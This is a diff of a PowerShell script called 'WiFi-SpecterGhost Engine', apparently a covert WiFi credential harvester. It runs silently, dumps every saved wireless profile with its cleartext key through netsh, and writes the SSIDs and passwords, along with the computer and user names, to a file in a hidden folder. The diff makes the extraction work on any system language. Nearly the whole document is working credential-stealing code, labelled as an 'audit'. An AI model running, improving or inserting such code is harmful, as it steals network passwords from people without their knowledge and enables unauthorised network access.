@@ -8,7 +8,10 @@ if not "%1"=="min" (
 )
 #>
 
-# --- WiFi-SpecterGhost Engine [Embedded - Discreto] ---
+# --- WiFi-SpecterGhost Engine [Embedded - Universal] ---
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
 $Silent = $true
 $UseHiddenFolder = $true
 $OutputName = "wpsd.txt"
@@ -48,32 +51,42 @@ try {
     $computerName = $env:COMPUTERNAME
     $userName = $env:USERNAME
     
-    "=========================================" | Add-Content -Path $outputFilePath -Encoding UTF8
-    " AUDITORIA: WiFi-SpecterGhost            " | Add-Content -Path $outputFilePath -Encoding UTF8
-    " FECHA    : $timestamp                   " | Add-Content -Path $outputFilePath -Encoding UTF8
-    " EQUIPO   : $computerName                " | Add-Content -Path $outputFilePath -Encoding UTF8
-    " USUARIO  : $userName                    " | Add-Content -Path $outputFilePath -Encoding UTF8
-    "=========================================" | Add-Content -Path $outputFilePath -Encoding UTF8
-    "" | Add-Content -Path $outputFilePath -Encoding UTF8
+    $header = @"
+=========================================
+ AUDITORIA: WiFi-SpecterGhost            
+ FECHA    : $timestamp                   
+ EQUIPO   : $computerName                
+ USUARIO  : $userName                    
+=========================================
+"@
+    $header | Add-Content -Path $outputFilePath -Encoding UTF8
 } catch { }
 
-# Obtener perfiles
+# Obtener perfiles - Regex agnostico (indentacion 4+ y colon)
 $profilesOutput = (netsh wlan show profiles 2>$null)
-$profileLines = $profilesOutput | Where-Object { $_ -match '^\s*(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)$' }
+$profileLines = $profilesOutput | Where-Object { $_ -match '^\s{4,}.+:\s+(.+)$' }
 
 if ($profileLines) {
     foreach ($line in $profileLines) {
-        $profileName = ($line -split ':', 2)[1].Trim()
-        $password = "[No encontrada]"
-        try {
-            $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
-            $keyLine = $profileDetailOutput | Where-Object { $_ -match '^\s*(?:Contenido de la clave|Key Content)\s*:\s*(.+)$' }
-            if ($keyLine) { $password = ($keyLine -split ':', 2)[1].Trim() }
-        } catch { continue }
-        try {
-            "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
-            "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
-            "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
-        } catch { }
+        if ($line -match ':\s*(.+)$') {
+            $profileName = $matches[1].Trim()
+            $password = "[No encontrada]"
+
+            try {
+                $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
+                foreach ($dLine in $profileDetailOutput) {
+                    if ($dLine -match '(?:Contenido de la clave|Key Content|Key Material)\s*:\s*(.+)$') {
+                        $password = $matches[1].Trim()
+                        break
+                    }
+                }
+            } catch { continue }
+
+            try {
+                "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
+                "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
+                "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
+            } catch { }
+        }
     }
 }
